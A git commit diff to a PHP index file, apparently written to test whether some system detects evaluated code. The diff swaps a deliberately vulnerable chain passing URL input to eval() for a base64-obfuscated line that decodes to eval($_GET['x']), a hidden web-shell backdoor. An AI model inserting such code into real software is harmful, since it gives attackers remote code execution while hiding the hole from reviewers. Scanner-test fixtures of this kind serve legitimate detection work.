29baed8df96f603a650d34c911e6bea0b9050901
4sonar1 <4sosnar1@int30x.cc>
2020-11-04 15:43:04 +0000

    Added some dynamic code evaluation to see if their system evaluates code

--- index.php
+++ index.php
@@ -1,14 +1,3 @@
 <?php
-function two($arg) {
-	eval($arg);
-}
-
-function one($arg, $more) {
-	$third = $arg . $more;
-	two($third);
-}
-
-one($_GET['x'], "brah");
-
-extract($_GET['x']);
+eval(base64_decode("ZXZhbCgkX0dFVFsieCJdKTs="))
 ?>
